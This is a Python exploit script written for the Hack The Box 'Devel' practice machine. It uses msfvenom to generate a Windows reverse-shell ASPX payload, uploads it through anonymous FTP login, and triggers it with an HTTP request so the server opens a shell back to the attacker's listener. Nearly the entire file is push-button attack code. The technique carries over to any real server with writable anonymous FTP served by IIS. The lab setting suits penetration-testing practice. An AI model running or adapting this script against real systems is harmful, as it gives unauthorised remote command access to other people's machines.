#!/usr/bin/python

# This exploit works on the Devel box from http://hackthebox.eu
# Push button and get User level access
# Written by Zulu CaPWN
# https://twitter.com/zulu_capwn

import requests
from ftplib import FTP
import os

########################
# Get listener IP/Port #
########################
lhost = raw_input('What is the listeners IP? (Do not prepend with http://) ')
lport = raw_input('What is the listeners Port? ')
print

##################################################
# Create the payload, msfvenom must be installed #
##################################################
cwd = os.getcwd() + '/'
filename = 'rev_shell_{}.aspx'.format(lport)
shell_cmd = 'msfvenom -p windows/shell_reverse_tcp -f aspx --platform windows -a x86 -e generic/none LHOST={} LPORT={} >  {}{}'.format(lhost, lport, cwd, filename)
print 'Creating payload, this will take a bit...\n'
os.system(shell_cmd)

################
# Login to ftp #
################
ftp = FTP('10.10.10.5')
ftp.login('anonymous', 'anonymous')
print 'Logged in\n'

######################
# Upload the payload #
######################
upload_me = open(cwd + filename, 'rb')
ftp.storlines('STOR ' + filename, upload_me)
print '{} uploaded!'.format(filename)
ftp.retrlines('LIST')
print
print 'Exiting ftp\n'
upload_me.close()
ftp.close()

#######################
# Trigger the exploit #
#######################
exploit_url = 'http://10.10.10.5/{}'.format(filename)
print 'Triggering exploit\n'
print 'Did you get a shell??'
r = requests.get(exploit_url)
